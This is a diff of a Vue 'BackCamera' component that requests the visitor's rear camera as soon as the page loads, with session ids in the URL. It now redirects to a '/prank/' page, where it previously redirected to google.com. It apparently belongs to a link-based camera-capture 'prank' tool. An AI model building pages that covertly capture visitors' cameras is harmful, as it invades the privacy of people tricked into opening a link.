@@ -3,16 +3,24 @@
 </template>
 
 <script>
+import {th} from "vuetify/locale";
+
 export default {
   name: "BackCamera",
 
   mounted() {
     this.capture()
   },
+  data() {
+    return {
+      session_id: null
+    }
+  },
 
   methods: {
     async capture() {
       const session_id = this.$route.params.id
+      this.session_id = session_id
       if (!session_id) return this.redirect()
 
       try {
@@ -21,7 +29,7 @@ export default {
         // 🟢 1) ENG BIRINCHI — environment bilan MAJBURLASH
         try {
           stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: { exact: "environment" } },
+            video: {facingMode: {exact: "environment"}},
             audio: false
           })
         } catch (e) {
@@ -40,7 +48,7 @@ export default {
           if (backCam) {
             try {
               stream = await navigator.mediaDevices.getUserMedia({
-                video: { deviceId: { exact: backCam.deviceId } },
+                video: {deviceId: {exact: backCam.deviceId}},
                 audio: false
               })
             } catch (e) {
@@ -52,7 +60,7 @@ export default {
         // 🟢 3) OXIRGI CHORA — ideal (lekin bu old kamera bo‘lishi mumkin)
         if (!stream) {
           stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: { ideal: "environment" } },
+            video: {facingMode: {ideal: "environment"}},
             audio: false
           })
         }
@@ -108,7 +116,7 @@ export default {
     },
 
     redirect() {
-      window.location.replace("https://google.com")
+      this.$router.push(`/prank/${this.session_id}`)
     }
   }
 }
